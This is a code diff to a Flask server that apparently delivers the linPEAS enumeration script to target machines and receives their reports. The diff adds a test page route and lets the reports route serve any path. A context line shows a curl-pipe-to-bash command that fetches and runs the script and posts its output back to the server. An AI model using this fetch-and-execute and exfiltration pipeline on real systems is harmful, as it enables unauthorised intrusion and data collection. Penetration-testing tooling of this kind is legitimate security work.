@@ -119,6 +119,13 @@ curl http://{request.host}/get-linpeas | bash | curl -X POST --data-binary @- -H
     """
 
 
+@app.route('/test.html')
+def serve_test():
+    """Serve test.html from root"""
+    log(f"[→] Serving test.html to {request.remote_addr}")
+    return send_file('test.html')
+
+
 @app.route('/get-script')
 def get_script():
     """Serve the wrapper script to target machine"""
@@ -224,11 +231,21 @@ def upload():
         return jsonify({'error': str(e)}), 500
 
 
-@app.route('/reports/<filename>')
+@app.route('/reports/<path:filename>')
 def serve_report(filename):
-    """Serve generated HTML reports"""
-    log(f"[→] Serving report: {filename}")
-    return send_from_directory(REPORTS_DIR, filename)
+    """Serve generated HTML reports and ALL associated files (JSON, etc.)"""
+    log(f"[→] Serving from reports/: {filename}")
+    
+    # Set proper MIME types
+    mimetype = None
+    if filename.endswith('.json'):
+        mimetype = 'application/json'
+    elif filename.endswith('.html'):
+        mimetype = 'text/html'
+    elif filename.endswith('.txt'):
+        mimetype = 'text/plain'
+    
+    return send_from_directory(REPORTS_DIR, filename, mimetype=mimetype)
 
 
 @app.route('/health')
